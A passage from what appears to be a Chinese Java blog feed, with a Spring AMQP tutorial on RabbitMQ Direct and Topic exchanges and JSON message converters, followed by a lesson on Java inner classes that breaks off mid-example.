src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788106-e7b49dcc-e945-401c-a98d-7481e0a711c1.png#averageHue=%23fbf5f5&crop=0&crop=0&crop=1&crop=1&id=Aj1Pf&originHeight=444&originWidth=1201&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="nE7lQ"></a></p><h3 id="3-5-1-基于注解声明队列和交换机"><a href="#3-5-1-基于注解声明队列和交换机" class="headerlink" title="3.5.1.基于注解声明队列和交换机"></a>3.5.1.基于注解声明队列和交换机</h3><p>基于@Bean的方式声明队列和交换机比较麻烦，Spring还提供了基于注解方式来声明。<br />在consumer的SpringRabbitListener中添加两个消费者，同时基于注解来声明队列和交换机：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;direct.queue1&quot;),</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;itcast.direct&quot;, type = ExchangeTypes.DIRECT),</span></span><br><span class="line"><span class="meta">    key = &#123;&quot;red&quot;, &quot;blue&quot;&#125;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenDirectQueue1</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到direct.queue1的消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;direct.queue2&quot;),</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;itcast.direct&quot;, type = ExchangeTypes.DIRECT),</span></span><br><span class="line"><span class="meta">    key = &#123;&quot;red&quot;, &quot;yellow&quot;&#125;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenDirectQueue2</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到direct.queue2的消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="oy60j"></a></p><h3 id="3-5-2-消息发送"><a href="#3-5-2-消息发送" class="headerlink" title="3.5.2.消息发送"></a>3.5.2.消息发送</h3><p>在publisher服务的SpringAmqpTest类中添加测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendDirectExchange</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 交换机名称</span></span><br><span class="line">    String exchangeName = <span class="string">&quot;itcast.direct&quot;</span>;</span><br><span class="line">    <span class="comment">// 消息</span></span><br><span class="line">    String message = <span class="string">&quot;红色警报！日本乱排核废水，导致海洋生物变异，惊现哥斯拉！&quot;</span>;</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    rabbitTemplate.convertAndSend(exchangeName, <span class="string">&quot;red&quot;</span>, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="Zua1L"></a></p><h3 id="3-5-3-总结"><a href="#3-5-3-总结" class="headerlink" title="3.5.3.总结"></a>3.5.3.总结</h3><p>描述下Direct交换机与Fanout交换机的差异？</p><ul><li>Fanout交换机将消息路由给每一个与之绑定的队列</li><li>Direct交换机根据RoutingKey判断路由给哪个队列</li><li>如果多个队列具有相同的RoutingKey，则与Fanout功能类似</li></ul><p>基于@RabbitListener注解声明队列和交换机有哪些常见注解？</p><ul><li><p><a href="/Queue">_@_Queue </a></p></li><li><p><a href="/Exchange">_@_Exchange </a><br><a name="sZ0IL"></a></p><h2 id="3-6-Topic"><a href="#3-6-Topic" class="headerlink" title="3.6.Topic"></a>3.6.Topic</h2><p><a name="iWcOC"></a></p><h3 id="3-6-1-说明"><a href="#3-6-1-说明" class="headerlink" title="3.6.1.说明"></a>3.6.1.说明</h3><p><code>Topic</code>类型的<code>Exchange</code>与<code>Direct</code>相比，都是可以根据<code>RoutingKey</code>把消息路由到不同的队列。只不过<code>Topic</code>类型<code>Exchange</code>可以让队列在绑定<code>Routing key</code> 的时候使用通配符！<br /><code>Routingkey</code> 一般都是有一个或多个单词组成，多个单词之间以”.”分割，例如： <code>item.insert</code><br />通配符规则：<br /><code>#</code>：匹配一个或多个词<br /><code>*</code>：匹配不多不少恰好1个词<br />举例：<br /><code>item.#</code>：能够匹配<code>item.spu.insert</code> 或者 <code>item.spu</code><br /><code>item.*</code>：只能匹配<code>item.spu</code><br />图示：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788193-3b31831c-3646-424d-818e-4a8c9ff69f27.png#averageHue=%23f8f0ef&crop=0&crop=0&crop=1&crop=1&id=r1SbP&originHeight=557&originWidth=1678&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />解释：</p></li><li><p>Queue1：绑定的是<code>china.#</code> ，因此凡是以 <code>china.</code>开头的<code>routing key</code> 都会被匹配到。包括china.news和china.weather</p></li><li><p>Queue2：绑定的是<code>#.news</code> ，因此凡是以 <code>.news</code>结尾的 <code>routing key</code> 都会被匹配。包括china.news和japan.news</p></li></ul><p>案例需求：<br />实现思路如下：</p><ol><li>并利用@RabbitListener声明Exchange、Queue、RoutingKey</li><li>在consumer服务中，编写两个消费者方法，分别监听topic.queue1和topic.queue2</li><li>在publisher中编写测试方法，向itcast. topic发送消息</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788285-52c1019e-b1a5-4f71-bf8f-e2d570632ca1.png#averageHue=%23fbf4f4&crop=0&crop=0&crop=1&crop=1&id=tcuAJ&originHeight=349&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="JqciL"></a></p><h3 id="3-6-2-消息发送"><a href="#3-6-2-消息发送" class="headerlink" title="3.6.2.消息发送"></a>3.6.2.消息发送</h3><p>在publisher服务的SpringAmqpTest类中添加测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * topicExchange</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendTopicExchange</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 交换机名称</span></span><br><span class="line">    String exchangeName = <span class="string">&quot;itcast.topic&quot;</span>;</span><br><span class="line">    <span class="comment">// 消息</span></span><br><span class="line">    String message = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    rabbitTemplate.convertAndSend(exchangeName, <span class="string">&quot;china.news&quot;</span>, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="JDboz"></a></p><h3 id="3-6-3-消息接收"><a href="#3-6-3-消息接收" class="headerlink" title="3.6.3.消息接收"></a>3.6.3.消息接收</h3><p>在consumer服务的SpringRabbitListener中添加方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;topic.queue1&quot;),</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;itcast.topic&quot;, type = ExchangeTypes.TOPIC),</span></span><br><span class="line"><span class="meta">    key = &quot;china.#&quot;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenTopicQueue1</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到topic.queue1的消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;topic.queue2&quot;),</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;itcast.topic&quot;, type = ExchangeTypes.TOPIC),</span></span><br><span class="line"><span class="meta">    key = &quot;#.news&quot;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenTopicQueue2</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到topic.queue2的消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="PARTg"></a></p><h3 id="3-6-4-总结"><a href="#3-6-4-总结" class="headerlink" title="3.6.4.总结"></a>3.6.4.总结</h3><p>描述下Direct交换机与Topic交换机的差异？</p><ul><li><p>Topic交换机接收的消息RoutingKey必须是多个单词，以 <code>**.**</code> 分割</p></li><li><p>Topic交换机与队列绑定时的bindingKey可以指定通配符</p></li><li><p><code>#</code>：代表0个或多个词</p></li><li><p><code>*</code>：代表1个词<br><a name="nEmH2"></a></p><h2 id="3-7-消息转换器"><a href="#3-7-消息转换器" class="headerlink" title="3.7.消息转换器"></a>3.7.消息转换器</h2><p>之前说过，Spring会把你发送的消息序列化为字节发送给MQ，接收消息的时候，还会把字节反序列化为Java对象。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788362-85cd58d8-6ff7-4b5d-9f87-dfd2505c40e2.png#averageHue=%23d7e8ca&crop=0&crop=0&crop=1&crop=1&id=RW0nO&originHeight=294&originWidth=1167&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />只不过，默认情况下Spring采用的序列化方式是JDK序列化。众所周知，JDK序列化存在下列问题：</p></li><li><p>数据体积过大</p></li><li><p>有安全漏洞</p></li><li><p>可读性差</p></li></ul><p>我们来测试一下。<br><a name="thtY7"></a></p><h3 id="3-7-1-测试默认转换器"><a href="#3-7-1-测试默认转换器" class="headerlink" title="3.7.1.测试默认转换器"></a>3.7.1.测试默认转换器</h3><p>我们修改消息发送的代码，发送一个Map对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendMap</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="comment">// 准备消息</span></span><br><span class="line">    Map&lt;String,Object&gt; msg = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    msg.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">    msg.put(<span class="string">&quot;age&quot;</span>, <span class="number">21</span>);</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    rabbitTemplate.convertAndSend(<span class="string">&quot;simple.queue&quot;</span>,<span class="string">&quot;&quot;</span>, msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>停止consumer服务<br />发送消息后查看控制台：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788452-169f9ba6-21ff-4c85-b9e9-c3f7c91c3653.png#averageHue=%23f9f8f7&crop=0&crop=0&crop=1&crop=1&id=ObbD9&originHeight=388&originWidth=1385&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="Aijdb"></a></p><h3 id="3-7-2-配置JSON转换器"><a href="#3-7-2-配置JSON转换器" class="headerlink" title="3.7.2.配置JSON转换器"></a>3.7.2.配置JSON转换器</h3><p>显然，JDK序列化方式并不合适。我们希望消息体的体积更小、可读性更高，因此可以使用JSON方式来做序列化和反序列化。<br />在publisher和consumer两个服务中都引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.dataformat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-dataformat-xml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置消息转换器。<br />在启动类中添加一个Bean即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MessageConverter <span class="title">jsonMessageConverter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Jackson2JsonMessageConverter();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a name=&quot;BB9gb&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;RabbitMQ&quot;&gt;&lt;a href=&quot;#RabbitMQ&quot; class=&quot;headerlink&quot; title=&quot;RabbitMQ&quot;&gt;&lt;/a&gt;RabbitMQ&lt;/h1&gt;&lt;p&gt;&lt;a name=&quot;XmLxR&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="Java" scheme="http://zephyr-cyber.github.io/categories/Java/"/>
    
    <category term="框架" scheme="http://zephyr-cyber.github.io/categories/Java/%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="Java框架" scheme="http://zephyr-cyber.github.io/tags/Java%E6%A1%86%E6%9E%B6/"/>
    
    <category term="RabbitMQ" scheme="http://zephyr-cyber.github.io/tags/RabbitMQ/"/>
    
  </entry>
  
  <entry>
    <title>Java-基础-内部类&amp;Lambda&amp;API</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/1758755152.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/1758755152.html</id>
    <published>2022-12-10T01:35:56.000Z</published>
    <updated>2022-12-15T03:28:39.680Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-内部类"><a href="#1-内部类" class="headerlink" title="1.内部类"></a>1.内部类</h2><h3 id="1-1-内部类的基本使用"><a href="#1-1-内部类的基本使用" class="headerlink" title="1.1 内部类的基本使用"></a>1.1 内部类的基本使用</h3><ul><li>内部类概念 <ul><li>在一个类中定义一个类。举例：在一个类A的内部定义一个类B，类B就被称为内部类</li></ul></li><li>内部类定义格式 <ul><li> 格式&amp;举例： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">格式：</span></span><br><span class="line"><span class="comment">    class 外部类名&#123;</span></span><br><span class="line"><span class="comment">    修饰符 class 内部类名&#123;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>内部类的访问特点 <ul><li>内部类可以直接访问外部类的成员，包括私有</li><li>外部类要访问内部类的成员，必须创建对象</li></ul></li><li> 代码： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    内部类访问特点：</span></span><br><span class="line"><span class="comment">        内部类可以直接访问外部类的成员，包括私有</span></span><br><span class="line"><span class="comment">        外部类要访问内部类的成员，必须创建对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> num = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Inner i = <span class="keyword">new</span> Inner();</span><br><span class="line">        i.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="1-2-成员内部类"><a href="#1-2-成员内部类" class="headerlink" title="1.2 成员内部类"></a>1.2 成员内部类</h3><ul><li>成员内部类的定义位置 <ul><li>在类中方法，跟成员变量是一个位置</li></ul></li><li>外界创建成员内部类格式 <ul><li>格式：外部类名.内部类名 对象名 = 外部类对象.内部类对象;</li><li>举例：Outer.Inner oi = new Outer().new Inner();</li></ul></li><li>私有成员内部类 <ul><li> 将一个类，设计为内部类的目的，大多数都是不想让外界去访问，所以内部类的定义应该私有化，私有化之后，再提供一个可以让外界调用的方法，方法内部创建内部类对象并调用。 </li><li> 代码： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> num = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Inner i = <span class="keyword">new</span> Inner();</span><br><span class="line">        i.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InnerDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//Outer.Inner oi = new Outer().new Inner();</span></span><br><span class="line"><span class="comment">//oi.show();</span></span><br><span class="line">        Outer o = <span class="keyword">new</span> Outer();</span><br><span class="line">        o.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>静态成员内部类 <ul><li> 静态成员内部类访问格式：外部类名.内部类名 对象名 = new 外部类名.内部类名(); </li><li> 静态成员内部类中的静态方法：外部类名.内部类名.方法名(); </li><li> 代码 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Inner</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;inner..show&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;inner..method&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test3Innerclass</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        静态成员内部类演示</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 外部类名.内部类名 对象名 = new 外部类名.内部类名();</span></span><br><span class="line">        Outer.Inner oi = <span class="keyword">new</span> Outer.Inner();</span><br><span class="line">        oi.show();</span><br><span class="line"></span><br><span class="line">        Outer.Inner.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="1-3-局部内部类"><a href="#1-3-局部内部类" class="headerlink" title="1.3 局部内部类"></a>1.3 局部内部类</h3><ul><li>局部内部类定义位置 <ul><li>局部内部类是在方法中定义的类</li></ul></li><li>局部内部类方式方式 <ul><li>局部内部类，外界是无法直接使用，需要在方法内部创建对象并使用</li><li>该类可以直接访问外部类的成员，也可以访问方法内的局部变量</li></ul></li><li> 代码 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Outer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> num = <span class="number">10</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num2 = <span class="number">20</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Inner</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                System.out.println(num);</span><br><span class="line">                System.out.println(num2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Inner i = <span class="keyword">new</span> Inner();</span><br><span class="line">        i.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OuterDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Outer o = <span class="keyword">new</span> Outer();</span><br><span class="line">        o.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="1-4-匿名内部类"><a href="#1-4-匿名内部类" class="headerlink" title="1.4 匿名内部类"></a>1.4 匿名内部类</h3><ul><li>匿名内部类的前提 <ul><li>存在一个类或者接口，这里的类可以是具体类也可以是抽象类</li></ul></li><li>匿名内部类的格式 <ul><li> 格式：new 类名 ( ) {  重写方法 }    new  接口名 ( ) { 重写方法 } </li><li> 举例： <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Inter()&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li>匿名内部类的本质 <ul><li>本质：是一个继承了该类或者实现了该接口的子类匿名对象</li></ul></li><li>匿名内部类的细节 <ul><li> 匿名内部类可以通过多态的形式接受 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Inter i = <span class="keyword">new</span> Inter()&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li> 匿名内部类直接调用方法 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Inter</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Inter()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;我是匿名内部类&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.method();<span class="comment">// 